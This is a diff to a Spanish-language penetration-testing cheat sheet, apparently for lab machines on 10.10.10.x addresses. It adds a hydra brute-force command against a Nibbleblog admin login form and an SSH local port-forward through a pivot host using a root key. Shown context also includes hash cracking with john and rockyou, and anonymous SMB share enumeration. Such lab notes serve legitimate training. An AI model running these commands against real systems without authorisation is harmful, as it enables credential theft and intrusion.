@@ -20,6 +20,8 @@ nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000
   una vez identificado se lanza el siguiente comando
   john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash.txt
   
+  hydra -l admin -P rockyou.txt 10.10.10.75 http-post-form "nibleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
+  
 
 ************************************************************* comandos para después de obtener una shell**
 Permiten que se pueda interactuar con la shell para poder usar las teclas subir bajar y digitar bien en editores de texto.
@@ -117,3 +119,11 @@ lxc exec ignite /bin/sh
 **********************************************************smb************************************************
 smbclient -N -L \\10.10.10.27\\
 smbclient -N \\10.10.10.27\backups
+
+*********************************************************Tunnel ssh ****************************************
+ssh -i root.key -L9000:10.10.10.75:80 10.10.10.73
+L9000: Puerto local a publicar
+10.10.10.75:80: IP y puerto remoto a consultar
+10.10.10.73 Servidor mediante el cual se realizará la salida.
+
+Al final en el navegador se consultará como http://localhost:9000
